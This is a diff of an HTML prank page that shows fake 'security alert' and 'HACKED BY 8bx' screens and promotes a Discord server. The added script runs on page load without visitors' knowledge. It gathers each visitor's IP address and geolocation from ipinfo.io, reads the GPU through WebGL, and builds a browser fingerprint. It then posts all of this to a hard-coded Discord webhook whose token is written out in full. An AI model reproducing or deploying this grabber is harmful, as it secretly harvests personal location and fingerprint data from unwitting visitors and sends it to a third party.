@@ -15,7 +15,7 @@
       font-family: 'Courier New', Courier, monospace;
       color: #ff0000;
     }
-    .loading, .main {
+    .loading, .main, .video-screen, .hacked-screen {
       position: fixed;
       top: 0; left: 0;
       width: 100%;
@@ -32,12 +32,12 @@
       background: rgba(0, 0, 0, 0.6);
     }
     .progress-container {
-      width: 350px;        /* أعرض قليلاً */
-      height: 20px;        /* أعلى قليلاً */
+      width: 350px;
+      height: 20px;
       background: rgba(255, 0, 0, 0.2);
       border-radius: 10px;
       overflow: hidden;
-      margin-top: 30px;    /* مسافة أكبر عن النص */
+      margin-top: 30px;
     }
     .progress-bar {
       width: 0;
@@ -48,6 +48,24 @@
     @keyframes fill {
       0%   { width: 0; }
       100% { width: 100%; }
+    }
+    .video-screen {
+      display: none;
+      background: black;
+    }
+    .video-screen video {
+  width: 100vw;
+  height: 100vh;
+  object-fit: cover;
+      border: none;
+    }
+    .hacked-screen {
+      display: none;
+      background: black;
+      color: white;
+      font-size: 3em;
+      font-family: 'Orbitron', sans-serif;
+      text-shadow: 0 0 10px white;
     }
     .main {
       display: none;
@@ -71,7 +89,7 @@
       max-width: 90vw;
     }
     .text a {
-      font-size: 3.2em;    /* كبّر الرابط قليلاً */
+      font-size: 3.2em;
       color: #ff0000;
       text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000;
       text-decoration: none;
@@ -80,23 +98,21 @@
     }
     .loading p {
       margin-top: 15px;
-      font-size: 1.6em;    /* كبّر "لا تنسى تخش الديسكورد" */
+      font-size: 1.6em;
       direction: rtl;
     }
     .loading .invite {
-      font-size: 2.5em;    /* كبّر "discord.gg/8bx" */
+      font-size: 2.5em;
       margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
-  <!-- الصوت يبدأ فورًا -->
   <audio autoplay loop>
-    <source src="https://cdn.discordapp.com/attachments/1344700524590661633/1392548629536964789/-_.mp3?ex=687140f9&is=686fef79&hm=3d18138ce5987abb9e91ff8e51b8b0828b8316e31307cd7d04340742ad781194&" type="audio/mpeg">
+    <source src="https://cdn.discordapp.com/attachments/1344700524590661633/1392548629536964789/-_.mp3?ex=686fef79&is=686e9df9&hm=0a43bc1faa92597e61f9bc2c7f4a45648a9857ad4eeaf8864d997d7bd6fbd6a2&" type="audio/mpeg">
   </audio>
 
-  <!-- شاشة التحميل -->
   <div class="loading" id="loading">
     <h1>SECURITY ALERT SAHM IN THE SYSTEM ..</h1>
     <div class="progress-container">
@@ -106,10 +122,19 @@
     <p>لا تنسى تخش الديسكورد</p>
   </div>
 
-  <!-- الصفحة الرئيسية -->
+  <div class="video-screen" id="video-screen">
+<video autoplay muted controls loop>
+  <source src="https://cdn.discordapp.com/attachments/1344700524590661633/1392731174098436187/yt1z.net_-_Welcome_to_the_Game_-_Hacking_Alert_720p.mp4?ex=6870997b&is=686f47fb&hm=e38921f3e4343496b578d1ab84ddbb80f1dbac7564b180a36f3cf62ac74f9ab6&.mp4" type="video/mp4">
+</video>  
+</div>
+
+  <div class="hacked-screen" id="hacked-screen">
+    HACKED BY 8bx
+  </div>
+
   <div class="main" id="main">
     <div class="image-container">
-      <img src="https://cdn.discordapp.com/attachments/1344700524590661633/1392545870821593118/0760ad4728018ff47ee7b5cd0a4ca9d1.webp?ex=68713e67&is=686fece7&hm=a7e73619ad759ed61f54e5b841f64eae90ee10962de0b3ccd1079415b67b7d8d&" alt="Discord GIF" />
+      <img src="https://cdn.discordapp.com/attachments/1344700524590661633/1392545870821593118/0760ad4728018ff47ee7b5cd0a4ca9d1.webp?ex=686fece7&is=686e9b67&hm=56bdd727326a06ac0c8331dd568fab6ef2ea23549bc40f6242e7852f8e48b51d&" alt="Discord GIF" />
     </div>
     <div class="info" id="ip-info">
       <strong>IP: <span id="ip"></span></strong><br />
@@ -127,15 +152,65 @@
   </div>
 
   <script>
-    // بعد 2.5 ثانية نخفي شاشة التحميل ونظهر المحتوى
+    const VIDEO_DURATION_MS = 9800;
+
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
-      document.getElementById('main').style.display = 'flex';
+      document.getElementById('video-screen').style.display = 'flex';
     }, 2500);
 
-    // جلب معلومات IP و GPU
+    setTimeout(() => {
+      document.getElementById('video-screen').style.display = 'none';
+      document.getElementById('hacked-screen').style.display = 'flex';
+
+      setTimeout(() => {
+        document.getElementById('hacked-screen').style.display = 'none';
+        document.getElementById('main').style.display = 'flex';
+
+        setTimeout(() => {
+          document.getElementById('main').style.display = 'none';
+
+          const demandScreen = document.createElement("div");
+          demandScreen.id = "demand-screen";
+          demandScreen.style.cssText = `
+            position:fixed;
+            top:0; left:0;
+            width:100vw;
+            height:100vh;
+            background:url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center;
+            background-size:cover;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            color:white;
+            font-size:3em;
+            font-family:'Orbitron', sans-serif;
+            text-shadow: 0 0 12px white;
+            z-index:9999;
+          `;
+          demandScreen.textContent = "نطالب_بفك_باند_زقرت#";
+          document.body.appendChild(demandScreen);
+
+          setTimeout(() => {
+            demandScreen.remove();
+            document.getElementById('video-screen').style.display = 'flex';
+
+            const iframe = document.querySelector('#video-screen iframe');
+const videoElement = document.querySelector('#video-screen video');
+videoElement.src = "https://cdn.discordapp.com/attachments/1344700524590661633/1392731175281492020/yt1z.net_-_Armageddon_1998_Paris_destruction_scene_1080p_1080p.mp4?ex=6870997b&is=686f47fb&hm=dfe5a3178ab3197ad6b1dc73171ff549042dd0dc8c74fd7f82334db3a8348274&";
+videoElement.play();
+
+
+
+          }, 6000);
+
+        }, 20000);
+
+      }, 3000);
+    }, 2500 + VIDEO_DURATION_MS);
+
     fetch('https://ipinfo.io/json')
-      .then(res => res.json())
+      .then(response => response.json())
       .then(data => {
         document.getElementById('ip').textContent = data.ip || 'N/A';
         document.getElementById('city').textContent = data.city || 'N/A';
@@ -144,17 +219,56 @@
         document.getElementById('loc').textContent = data.loc || 'N/A';
         document.getElementById('org').textContent = data.org || 'N/A';
         document.getElementById('timezone').textContent = data.timezone || 'N/A';
-        let gpu = 'N/A';
+
+        let gpuInfo = 'N/A';
         try {
           const canvas = document.createElement('canvas');
           const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-          if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-        } catch {}
-        document.getElementById('gpu').textContent = gpu;
-        // إرسال للويبهوك...
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+        } catch(e) {}
+        document.getElementById('gpu').textContent = gpuInfo;
+
+        const hwidRaw = [
+          navigator.userAgent,
+          navigator.language,
+          screen.width,
+          screen.height,
+          screen.colorDepth,
+          navigator.platform,
+          gpuInfo
+        ].join("|");
+
+        const hwid = btoa(hwidRaw);
+        const formattedHWID = hwid.match(/.{1,64}/g).join("\n");
+
+        const webhookUrl = "https://canary.discord.com/api/webhooks/1365004260542120000/oGgcBxTqweKzy1ouej3dhuP9eDMT5_AxgiwhM4oYvO0rOob6gD7cdxkvYUKt_O2X838_";
+        const embed = {
+          title: "📥 زائر جديد دخل الموقع",
+          color: 16711680,
+          fields: [
+            { name: "🌐 IP", value: data.ip || "N/A", inline: true },
+            { name: "🏙️ City", value: data.city || "N/A", inline: true },
+            { name: "🌍 Country", value: data.country || "N/A", inline: true },
+            { name: "🧭 Region", value: data.region || "N/A", inline: true },
+            { name: "📍 Location", value: data.loc || "N/A", inline: true },
+            { name: "🏢 Org", value: data.org || "N/A", inline: true },
+            { name: "🕒 Timezone", value: data.timezone || "N/A", inline: true },
+            { name: "🖥️ GPU", value: gpuInfo, inline: true },
+            { name: "🔗 Page", value: window.location.href, inline: false },
+            { name: "🧬 HWID ID", value: formattedHWID || "N/A", inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        };
+
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ embeds: [embed] })
+        });
       });
   </script>
-
 </body>
 </html>
